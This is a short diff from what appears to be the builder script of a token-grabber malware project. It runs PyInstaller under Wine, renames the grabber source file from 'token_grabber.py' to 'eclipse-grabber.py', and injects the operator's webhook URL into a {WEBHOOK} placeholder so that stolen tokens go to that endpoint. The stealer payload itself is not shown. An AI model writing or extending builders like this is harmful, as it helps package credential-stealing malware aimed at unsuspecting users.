@@ -13,7 +13,7 @@ class Builder:
         self.path_to_pyinstaller = "/root/.wine/drive_c/users/root/Local Settings/Application Data/Programs/Python/Python38-32/Scripts/pyinstaller.exe"
 
     def build(self):        
-        f = open("code/token_grabber.py", 'r')
+        f = open("code/eclipse-grabber.py", 'r')
         file = f.read()
         f.close()
         newfile = file.replace("{WEBHOOK}", str(self.webhook))
